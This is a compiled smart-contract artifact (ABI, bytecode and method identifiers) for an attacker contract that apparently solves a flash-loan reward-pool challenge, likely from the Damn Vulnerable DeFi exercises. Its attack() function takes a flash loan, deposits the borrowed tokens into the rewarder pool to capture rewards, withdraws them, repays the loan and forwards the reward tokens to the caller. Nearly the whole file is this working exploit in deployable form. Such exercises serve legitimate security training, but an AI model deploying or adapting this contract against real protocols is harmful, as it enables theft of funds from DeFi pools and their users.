{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_theAwarderPoolAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_flashLoanerPoolAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_liquidityTokenAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_awardTokenAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "TOKENS_IN_LENDER_POOL",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "USER_DEPOSIT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "receiveFlashLoan",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x60a060405234801561001057600080fd5b5060405161057d38038061057d83398101604081905261002f916100a2565b600080546001600160a01b039586166001600160a01b0319918216179091556001805494861694821694909417909355600380549285169284169290921790915590911660805260028054909116331790556100f6565b80516001600160a01b038116811461009d57600080fd5b919050565b600080600080608085870312156100b857600080fd5b6100c185610086565b93506100cf60208601610086565b92506100dd60408601610086565b91506100eb60608601610086565b905092959194509250565b60805161046c610111600039600061020f015261046c6000f3fe60806040526004361061003f5760003560e01c80632ff1b740146100445780634fd9cb81146100745780639e5faafc14610096578063ce33aaa91461009e575b600080fd5b34801561005057600080fd5b5061006269d3c21bcecceda100000081565b60405190815260200160405180910390f35b34801561008057600080fd5b5061009461008f3660046103db565b6100bb565b005b610094610372565b3480156100aa57600080fd5b5061006268056bc75e2d6310000081565b60035460005460405163095ea7b360e01b81526001600160a01b0391821660048201526024810184905291169063095ea7b3906044016020604051808303816000875af1158015610110573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013491906103f4565b5060005460405163b6b55f2560e01b8152600481018390526001600160a01b039091169063b6b55f2590602401600060405180830381600087803b15801561017b57600080fd5b505af115801561018f573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152600481018590526001600160a01b039091169250632e1a7d4d9150602401600060405180830381600087803b1580156101d957600080fd5b505af11580156101ed573d6000803e3d6000fd5b50506002546040516370a0823160e01b81523060048201526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116945063a9059cbb93509091169083906370a0823190602401602060405180830381865afa158015610265573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610289919061041d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156102d4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102f891906103f4565b5060035460405163a9059cbb60e01b8152336004820152602481018390526001600160a01b039091169063a9059cbb906044016020604051808303816000875af115801561034a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061036e91906103f4565b5050565b600154604051639ab603b960e01b815269d3c21bcecceda100000060048201526001600160a01b0390911690639ab603b990602401600060405180830381600087803b1580156103c157600080fd5b505af11580156103d5573d6000803e3d6000fd5b50505050565b6000602082840312156103ed57600080fd5b5035919050565b60006020828403121561040657600080fd5b8151801515811461041657600080fd5b9392505050565b60006020828403121561042f57600080fd5b505191905056fea264697066735822122085921b2c3d231138d7a450319375e50639b28082194ca97b3ad332cf0298c62c64736f6c634300080f0033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "TOKENS_IN_LENDER_POOL()": "2ff1b740",
    "USER_DEPOSIT()": "ce33aaa9",
    "attack()": "9e5faafc",
    "receiveFlashLoan(uint256)": "4fd9cb81"
  },
  "id": 32
}